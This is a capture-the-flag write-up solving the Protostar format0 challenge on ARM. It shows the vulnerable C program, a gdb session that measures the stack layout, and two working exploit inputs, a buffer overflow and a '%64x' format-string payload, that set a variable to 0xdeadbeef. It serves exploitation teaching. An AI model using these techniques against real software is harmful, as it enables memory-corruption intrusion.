## Protostar ARM format0

#### Source Code

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void vuln(char *string)
{
  volatile int target;
  char buffer[64];

  target = 0;

  sprintf(buffer, string);

  if(target == 0xdeadbeef) {
    printf("you have hit the target correctly :)\n");
  }
}

int main(int argc, char **argv)
{
  vuln(argv[1]);
}

```
#### _Let's start_

We start with the challenges related to the [format string vulnerability](https://owasp.org/www-community/attacks/Format_string_attack). To solve the challenge we have to set the variable `target` to the value `0xdeadbeef`. Let's open `gdb`, set a breakpoint in the `vuln()` function at the address `0x00010478` and run the program using as input a simple string like `aaaaa`.

Before to start with these challenges I recommend to read [this article](https://crypto.stanford.edu/cs155old/cs155-spring08/papers/formatstring-1.2.pdf)

```code
i@raspberrypi:~/protostar/format/format0 $ gdb ./format0
....
gef➤  disassemble vuln
Dump of assembler code for function vuln:
   0x00010438 <+0>:	push	{r11, lr}
   0x0001043c <+4>:	add	r11, sp, #4
   0x00010440 <+8>:	sub	sp, sp, #80	; 0x50
   0x00010444 <+12>:	str	r0, [r11, #-80]	; 0xffffffb0
   0x00010448 <+16>:	mov	r3, #0
   0x0001044c <+20>:	str	r3, [r11, #-8]
   0x00010450 <+24>:	sub	r3, r11, #72	; 0x48
   0x00010454 <+28>:	ldr	r1, [r11, #-80]	; 0xffffffb0
   0x00010458 <+32>:	mov	r0, r3
   0x0001045c <+36>:	bl	0x10330 <sprintf@plt>
   0x00010460 <+40>:	ldr	r3, [r11, #-8]
   0x00010464 <+44>:	ldr	r2, [pc, #24]	; 0x10484 <vuln+76>
   0x00010468 <+48>:	cmp	r3, r2
   0x0001046c <+52>:	bne	0x10478 <vuln+64>
   0x00010470 <+56>:	ldr	r0, [pc, #16]	; 0x10488 <vuln+80>
   0x00010474 <+60>:	bl	0x1030c <puts@plt>
   0x00010478 <+64>:	nop			; (mov r0, r0)
   0x0001047c <+68>:	sub	sp, r11, #4
   0x00010480 <+72>:	pop	{r11, pc}
   0x00010484 <+76>:	cdple	14, 10, cr11, cr13, cr15, {7}
   0x00010488 <+80>:	andeq	r0, r1, r4, lsr r5
End of assembler dump.
gef➤  b *0x00010478
Breakpoint 1 at 0x10478: file format0.c, line 18.
gef➤  r aaaaa
Starting program: /home/pi/protostar/format/format0/format0 aaaaa

Breakpoint 1, vuln (string=0x7efff6e2 "aaaaa") at format0.c:18
18	}
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$r0  : 0x5       
$r1  : 0x7efff6e7  →  0x45485300
$r2  : 0xdeadbeef
$r3  : 0x0       
$r4  : 0x0       
$r5  : 0x000104c4  →  <__libc_csu_init+0> push {r4,  r5,  r6,  r7,  r8,  r9,  r10,  lr}
$r6  : 0x00010348  →  <_start+0> mov r11,  #0
$r7  : 0x0       
$r8  : 0x0       
$r9  : 0x0       
$r10 : 0x76fff000  →  0x00030f44
$r11 : 0x7efff404  →  0x000104b4  →  <main+40> mov r3,  #0
$r12 : 0x25      
$sp  : 0x7efff3b0  →  0x00000004
$lr  : 0x00010460  →  <vuln+40> ldr r3,  [r11,  #-8]
$pc  : 0x00010478  →  <vuln+64> nop ; (mov r0,  r0)
$cpsr: [negative zero carry overflow interrupt fast thumb]
──────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x7efff3b0│+0x0000: 0x00000004	 ← $sp
0x7efff3b4│+0x0004: 0x7efff6e2  →  "aaaaa"
0x7efff3b8│+0x0008: 0x76fffc70  →  0x76ffd000  →  0x464c457f
0x7efff3bc│+0x000c: "aaaaa"
0x7efff3c0│+0x0010: 0x7eff0061  →  0x00000000
0x7efff3c4│+0x0014: 0x00000000
0x7efff3c8│+0x0018: 0x00000000
0x7efff3cc│+0x001c: 0x00000000
───────────────────────────────────────────────────────────────────────────────────────────────── code:arm:ARM ────
      0x1046c <vuln+52>        bne    0x10478 <vuln+64>
      0x10470 <vuln+56>        ldr    r0,  [pc,  #16]	; 0x10488 <vuln+80>
      0x10474 <vuln+60>        bl     0x1030c <puts@plt>
 →    0x10478 <vuln+64>        nop    ; (mov r0,  r0)
      0x1047c <vuln+68>        sub    sp,  r11,  #4
      0x10480 <vuln+72>        pop    {r11,  pc}
      0x10484 <vuln+76>        cdple  14,  10,  cr11,  cr13,  cr15,  {7}
      0x10488 <vuln+80>        andeq  r0,  r1,  r4,  lsr r5
      0x1048c <main+0>         push   {r11,  lr}
────────────────────────────────────────────────────────────────────────────────────────── source:format0.c+18 ────
     13	   sprintf(buffer, string);
     14	 
     15	   if(target == 0xdeadbeef) {
     16	     printf("you have hit the target correctly :)\n");
     17	   }
 →   18	 }
     19	 
     20	 int main(int argc, char **argv)
     21	 {
     22	   vuln(argv[1]);
     23	 }
────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "format0", stopped 0x10478 in vuln (), reason: BREAKPOINT
──────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x10478 → vuln(string=0x7efff6e2 "aaaaa")
[#1] 0x104b4 → main(argc=0x2, argv=0x7efff564)
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  print target
$1 = 0x0
gef➤  print *target
Cannot access memory at address 0x0
gef➤  print &target
$2 = (volatile int *) 0x7efff3fc
gef➤  print &buffer
$3 = (char (*)[64]) 0x7efff3bc
gef➤  print (0x7efff3fc-0x7efff3bc)
$4 = 0x40
gef➤  
```

As we can see the variable `target` is allocated just after the space allocated for the `buffer` variable `(0x40h -> 64 bytes)`. We can solve this challenge using a simple buffer overflow due to the unchecked size of our input.
If we use as user input a string long `64 bytes` and the value `0xdeadbeef` (Little Endian Order) we should be able to solve the challenge.

Let's try
```code
pi@raspberrypi:~/protostar/format/format0 $ ./format0 $(python -c "print 'A'* 64 + '\xef\xbe\xad\xde'")
you have hit the target correctly :)
```

#### _What about the format string?!_

A format string vulnerability allows an attacker to write bytes on the stack. In order to write 64 bytes on the stack we can use `%64x` which allows us to write 64 bytes on the stack and write, as 65th bytes, the value `\xef\xbe\xad\xde` in order to have `target` = `0xdeadbeef`.

```code
pi@raspberrypi:~/protostar/format/format0 $ ./format0 $(python -c "print '%64x\xef\xbe\xad\xde'")
you have hit the target correctly :)
```

__*Done :)*__
